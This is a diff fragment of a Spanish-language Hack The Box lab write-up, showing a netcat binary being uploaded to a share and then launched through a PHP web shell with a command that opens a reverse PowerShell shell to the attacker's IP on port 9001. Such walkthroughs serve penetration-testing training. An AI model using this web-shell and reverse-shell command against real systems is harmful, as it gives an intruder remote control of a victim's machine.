@@ -183,9 +183,11 @@ ahora vamos a localizar el binario de netcat para poder subirlo a la maquina
 /home/gleoq/Desktop/Hack-The-Box/Advanced-Labs/Context/netcat.exe # esta es la ruta del archivo
 
 ❯ cp /home/gleoq/Desktop/Hack-The-Box/Advanced-Labs/Context/netcat.exe .
+
 ```
 
 ahora que ya tenemos el binario en nuestra ubicación de trabajo vamos a subirlo al recurso compartido de la misma manera que hemos hecho con los otros archivos
 
 ahora solo debemos cargar los dos archivos y luego podemos ejecutarlo desde la web con el siguiente comando
-http://school.flight.htb/shell.php?cmd=netcat.exe -e powershell.exe%2010.10.14.8%209001
+`http://school.flight.htb/shell.php?cmd=netcat.exe -e powershell.exe 10.10.14.8 9001`
+![[Pasted image 20240810145130.png]]
